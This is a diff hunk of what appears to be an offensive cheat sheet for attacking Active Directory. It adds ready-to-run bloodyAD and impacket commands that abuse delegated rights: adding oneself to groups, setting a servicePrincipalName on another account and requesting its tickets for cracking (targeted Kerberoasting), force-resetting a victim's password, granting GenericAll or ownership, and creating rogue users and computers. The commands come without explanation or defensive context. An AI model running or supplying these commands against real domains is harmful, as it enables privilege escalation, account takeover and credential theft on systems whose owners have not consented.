@@ -468,10 +468,19 @@ https://datafetcher.com/graphql-json-body-converter
 +---------- TGT .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 
++---------- AddSelf ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+
++---------- GenericWrite ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+
++---------- ForceChangePassword ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
+
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
